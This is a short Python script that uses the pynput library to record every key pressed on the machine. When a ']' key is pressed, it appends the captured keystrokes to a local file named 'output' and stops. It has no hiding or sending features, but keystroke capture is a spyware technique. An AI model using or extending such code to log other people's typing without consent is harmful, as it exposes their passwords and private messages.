from pynput import keyboard
import os

typed_chars = ''
def on_press(key):
    global typed_chars
    typed_chars += str(key) + ' '
    if typed_chars[-3] == ']':
        output_file = os.path.join(os.getcwd(), 'output')

        # Check if file exists, if not, create it
        if not os.path.isfile(output_file):
            open(output_file, 'w').close()

        with open(output_file, 'a') as f:
            f.write(typed_chars)
        exit()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()